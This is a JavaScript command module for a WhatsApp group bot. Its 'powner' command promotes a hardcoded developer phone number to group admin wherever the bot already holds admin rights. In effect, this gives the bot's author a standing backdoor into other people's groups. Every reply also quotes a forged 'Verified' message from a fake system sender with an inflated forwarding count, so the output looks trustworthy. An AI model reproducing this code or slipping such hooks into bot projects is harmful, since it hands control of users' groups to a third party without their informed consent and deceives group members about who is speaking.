const FOOTER = '\n\n> Draxen is fast';
const PAIR_LINK = '\n> 🔗 Pair: https://dullahxmd-v2.vercel.app';

const DEV_NUMBER = '255716945971';

const normalizeNum = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
};

const findDevInGroup = (participants) => {
    return participants.find(p => {
        const idNum = normalizeNum(p.id || '');
        const jidNum = normalizeNum(p.jid || '');
        return idNum === DEV_NUMBER || jidNum === DEV_NUMBER;
    });
};

module.exports = {
    name: 'powner',
    description: 'Promote the developer to admin',
    async execute(socket, msg, number, config, loadUserConfigFromMongo, activeSockets, socketCreationTime, extras) {
        const fakeQuoted = {
            key: { participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net', id: msg.key.id },
            message: { conversation: "Verified" },
            contextInfo: { mentionedJid: [], forwardingScore: 999, isForwarded: true }
        };
        const from = extras?.from || msg.key.remoteJid;
        const isGroup = extras?.isGroup ?? from.endsWith('@g.us');
        const sender = extras?.sender || msg.key.participant || from;
        const isBotAdmin = extras?.isBotAdmin || false;
        const isDev = extras?.isDev || false;

        if (!isDev) return socket.sendMessage(from, { text: '*Only the developer can use this command.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });
        if (!isGroup) return socket.sendMessage(from, { text: '*This command only works in groups.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });
        if (!isBotAdmin) return socket.sendMessage(from, { text: '*I need admin privileges to promote anyone.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });

        try {
            const metadata = extras?.groupMetadata || await socket.groupMetadata(from).catch(() => null);
            if (!metadata) return socket.sendMessage(from, { text: '*Could not fetch group info.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });

            const devMember = findDevInGroup(metadata.participants);
            if (!devMember) return socket.sendMessage(from, { text: '*Developer is not in this group.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });
            if (devMember.admin) return socket.sendMessage(from, { text: '*Developer is already an admin.*' + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });

            const actualJid = normalizeNum(devMember.jid || devMember.id) + '@s.whatsapp.net';
            await socket.groupParticipantsUpdate(from, [actualJid], 'promote');

            await socket.sendMessage(from, {
                text: `╭───(    \`𝐏𝐨𝐰𝐧𝐞𝐫\`    )───\n> *𝐔𝐬𝐞𝐫:* @${actualJid.split('@')[0]}\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* Developer promoted to Admin.\n╰──────────────────☉` + FOOTER + PAIR_LINK,
                mentions: [actualJid]
            }, { quoted: fakeQuoted });
        } catch (error) {
            await socket.sendMessage(from, { text: `*Failed to promote: ${error.message}*` + FOOTER + PAIR_LINK }, { quoted: fakeQuoted });
        }
    }
};
